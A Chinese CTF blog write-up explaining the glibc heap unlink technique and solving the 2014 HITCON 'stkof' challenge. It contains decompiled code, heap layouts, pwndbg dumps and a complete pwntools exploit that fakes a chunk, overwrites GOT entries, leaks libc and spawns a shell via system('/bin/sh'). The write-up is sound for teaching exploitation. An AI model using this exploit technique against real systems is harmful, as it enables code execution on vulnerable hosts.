---
layout:     post   				    # 使用的布局（不需要改）
title:      Unlink笔记&2014 HITCON stkof题解 		 # 标题 
subtitle:   Unlink笔记&2014 HITCON stkof题解               # 副标题
date:       2018-09-03 				# 时间
author:     Mr.R 					# 作者
# header-img: img/post-bg-2015.jpg 	# 这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								# 标签
    - CTF
---

# Unlink笔记&2014 HITCON stkof题解

> 今天调出来了人生中第一个堆利用的漏洞...有点兴奋…来记录一下

题目在[CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/)中有

## Unlink



我们在利用 unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。

unlink的主要操作其实就是一个双向链表的删除

```c
void unlink(*p){
    FD = p->fd;
    BK = p->bk;
    if(FD->bk == p && BK->fd == p){		//古老的unlink是没有这个判断的,所以可以配合shellcode直接任意执行
        FD->bk = BK;
        BK->fd = FD;
    }
}
```

虽然有这个问题,但是我们可以通过构造FD->bk = p,BK->fd = p 来绕过

|        chunk Q: Pre_size         |
| :------------------------------: |
|               size               |
|             Userdata             |
|     **chunk next: Pre_size**     |
|               size               |
|                fd                |
|                bk                |
| **chunk next of next: Pre_size** |
|               size               |
|             Userdata             |

我们在free(next of next)的时候,他会通过size检测上一个chunk是否空闲,如果空闲,就会合并,触发unlink(next)

这时候,我们只需要

```
next->fd = next-0x18/12
next->bk = next-0x10/8
```

就可以满足以下操作

```
FD = P->fd = P-0x18/12
BK = P->bk = P-0x10/8
FD->bk = FD+0x18/12 = P-0x18/12+0x18/12 = P
BK->fd = BK+0x10/8 = P-0x10/8+0x10/8 = P

FD->bk = BK -------> P = P-0x10/8
BK->fd = FD -------> P = P-0x18/12

P = P-0x18/12
```

即最终在满足判断的情况下,使的指针降低了0x18/12位(由64/32位系统决定)

## 题目分析



首先题目就是实现了一个内存分配器,有alloc,free,edit功能

* 分配自定义大小的chunk
* 修改堆中储存内容,**自定义大小**
* 释放堆

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int choice; // eax
  signed int v5; // [rsp+Ch] [rbp-74h]
  char nptr; // [rsp+10h] [rbp-70h]
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  alarm(0x78u);
  while ( fgets(&nptr, 10, stdin) )
  {
    choice = atoi(&nptr);
    if ( choice == 2 )
    {
      v5 = fill();
      goto LABEL_14;
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        v5 = free_chunk();
        goto LABEL_14;
      }
      if ( choice == 4 )
      {
        v5 = print();
        goto LABEL_14;
      }
    }
    else if ( choice == 1 )
    {
      v5 = alloc();
      goto LABEL_14;
    }
    v5 = -1;
LABEL_14:
    if ( v5 )
      puts("FAIL");
    else
      puts("OK");
    fflush(stdout);
  }
  return 0LL;
}
```

翻看fill()函数

```c
signed __int64 fill()
{
  signed __int64 result; // rax
  int i; // eax
  unsigned int idx; // [rsp+8h] [rbp-88h]
  __int64 size; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s; // [rsp+20h] [rbp-70h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(&s, 16, stdin);
  idx = atol(&s);
  if ( idx > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !globals[idx] )
    return 0xFFFFFFFFLL;
  fgets(&s, 16, stdin);
  size = atoll(&s);
  ptr = globals[idx];
  for ( i = fread(ptr, 1uLL, size, stdin); i > 0; i = fread(ptr, 1uLL, size, stdin) )
  {
    ptr += i;
    size -= i;
  }
  if ( size )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
```

很显然存在堆溢出



alloc函数

```c
signed __int64 alloc()
{
  __int64 size; // [rsp+0h] [rbp-80h]
  char *v2; // [rsp+8h] [rbp-78h]
  char s; // [rsp+10h] [rbp-70h]
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(&s, 16, stdin);
  size = atoll(&s);
  v2 = (char *)malloc(size);
  if ( !v2 )
    return 0xFFFFFFFFLL;
  globals[++cnt] = v2;
  printf("%d\n", (unsigned int)cnt, size);
  return 0LL;
}
```



可以看出是先申请一个堆,然后把堆的地址存在全局变量globals里面



## 基本思路

首先程序没有system等,我们需要自己leak出offset配合libc找出system地址

* 伪造堆,unlink 将globals[2]改为&globals[2]-0x18

* 通过edit 将globals[1]改为free@got,globals[2]改为puts@got,globals[3]改为atoi@got

* 通过edit,将free@got改为puts@plt,这样在下一次free的时候,就可以执行puts来leak了

* 将atoi@got改为system_addr,利用main函数中的atoi来获取shell


## 代码分析

1. 各功能模拟

   ```python
   s = process("./stkof")
   libc = ELF("./libc.so.6")
   elf = ELF("./stkof")
   
   def alloc(size):
       s.sendline("1")
       s.sendline(str(size))
       s.recvuntil("OK\n")
       log.success("Have Malloc A Heap With:"+hex(size))
   
   def free(idx):
       s.sendline("3")
       s.sendline(str(idx))
       # s.recvuntil("OK\n")
       log.success("Have Free Heap:"+str(idx))
   
   def edit(idx,size,payload):
       s.sendline("2")
       s.sendline(str(idx))
       s.sendline(str(size))
       s.send(payload)
       s.recvuntil("OK\n")
       log.success("Have Edit Heap:"+str(idx))
   ```


2.申请堆&伪造堆

我们首先看合并的部分源码

```c
        if (!prev_inuse(p)) {
            prevsize = prev_size(p);
            size += prevsize;
            p = chunk_at_offset(p, -((long) prevsize));
            unlink(av, p, bck, fwd);
        }
```

首先判断了前一个chunk是否在使用中,我们知道size的最低位为0代表未使用

然后通过prev_size来找到上一个chunk,我们可以通过堆溢出来覆盖掉他

```python
head = 0x0602140
# gdb.attach(s,"break *0x400D29")
alloc(0x100) # idx 1
alloc(0x30) # idx 2
alloc(0x80) # idx 3
fd = head+16-0x18
bk = head+16-0x10
payload1 = p64(0)+p64(0x30)+p64(fd)+p64(bk)
payload1 = payload1.ljust(0x30,'A')
payload1 += p64(0x30) + p64(0x90)	#伪造ptr3的pre_size和size(使其认为前一个chunk是空闲的)
edit(2, len(payload1), payload1)
free(3)
```

这样就可以执行使(head+16)-0x18 。

这里要说明的一点是globals(head + 8 * n)中所存的地址是chunk中data的地址,**即我们伪造的chunk的地址**

在unlink前的堆布局是这样的

|       Ptr2:prev_size       |
| :------------------------: |
|            size            |
| **Fake Chunk:prev_size=0** |
|        Size = 0x30         |
|     fd = head+16-0x18      |
|     bk = head+16-0x10      |
|          "A"*0x10          |
|  **Ptr3:prev_size=0x30**   |
|         size=0x90          |

unlink的就是我们的Fake Chunk

3.这时候,我们的globals[2] = globals[2]-0x18(***0x00602138***)

```
pwndbg> x/32g 0x0602140
0x602140:	0x0000000000000000	0x0000000001517020
0x602150:	0x0000000000602138	0x0000000000000000
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
0x6021a0:	0x0000000000000000	0x0000000000000000
0x6021b0:	0x0000000000000000	0x0000000000000000
0x6021c0:	0x0000000000000000	0x0000000000000000
0x6021d0:	0x0000000000000000	0x0000000000000000
0x6021e0:	0x0000000000000000	0x0000000000000000
0x6021f0:	0x0000000000000000	0x0000000000000000
0x602200:	0x0000000000000000	0x0000000000000000
0x602210:	0x0000000000000000	0x0000000000000000
0x602220:	0x0000000000000000	0x0000000000000000
0x602230:	0x0000000000000000	0x0000000000000000
```



再编辑的时候就可以从0x00602138这个地址开始写数据

```python
free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']
payload = 'a'*16 + p64(free_got) + p64(puts_got) + p64(atoi_got)
edit(2,len(payload),payload)
```



```
pwndbg> x/32g 0x0602140
0x602140:	0x6161616161616161	0x0000000000602018
0x602150:	0x0000000000602020	0x0000000000602088
0x602160:	0x0000000000000000	0x0000000000000000
```

4.这时候我们编辑ptr1就相当于在编辑free@got 之后free(2)就相当于puts(puts@got)

```python
edit(1,len(p64(puts_plt)),p64(puts_plt))
free(2)
s.recvline()
puts_real = u64(s.recvline(keepends=False)[0:8].ljust(8,'\x00'))
log.success("Puts_real:"+hex(puts_real))
offset = puts_real - libc.symbols['puts']
log.success("Offset:"+hex(offset))
```

获得offset

5.通过offset算出system地址,手动读入/bin/sh即可

```python
system_addr = libc.symbols['system']+offset
log.success("System_addr:"+hex(system_addr))
edit(3,len(p64(system_addr)),p64(system_addr))
s.sendline("/bin/sh\x00")
s.interactive()
```



## 完整代码

```python
from pwn import *

s = process("./stkof")
libc = ELF("./libc.so.6")
elf = ELF("./stkof")

def alloc(size):
    s.sendline("1")
    s.sendline(str(size))
    s.recvuntil("OK\n")
    log.success("Have Malloc A Heap With:"+hex(size))

def free(idx):
    s.sendline("3")
    s.sendline(str(idx))
    # s.recvuntil("OK\n")
    log.success("Have Free Heap:"+str(idx))

def edit(idx,size,payload):
    s.sendline("2")
    s.sendline(str(idx))
    s.sendline(str(size))
    s.send(payload)
    s.recvuntil("OK\n")
    log.success("Have Edit Heap:"+str(idx))

head = 0x0602140
# gdb.attach(s,"break *0x400D29")
alloc(0x100) # idx 1
alloc(0x30) # idx 2
alloc(0x80) # idx 3
fd = head+16-0x18
bk = head+16-0x10
payload1 = p64(0)+p64(0x30)+p64(fd)+p64(bk)
payload1 = payload1.ljust(0x30,'A')
payload1 += p64(0x30) + p64(0x90)
edit(2, len(payload1), payload1)
free(3)
# print payload1
free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']

payload = 'a'*16 + p64(free_got) + p64(puts_got) + p64(atoi_got)
edit(2,len(payload),payload)
edit(1,len(p64(puts_plt)),p64(puts_plt))
free(2)
s.recvline()
puts_real = u64(s.recvline(keepends=False)[0:8].ljust(8,'\x00'))
log.success("Puts_real:"+hex(puts_real))
offset = puts_real - libc.symbols['puts']
log.success("Offset:"+hex(offset))
system_addr = libc.symbols['system']+offset
log.success("System_addr:"+hex(system_addr))
edit(3,len(p64(system_addr)),p64(system_addr))
s.sendline("/bin/sh")
s.interactive()

```

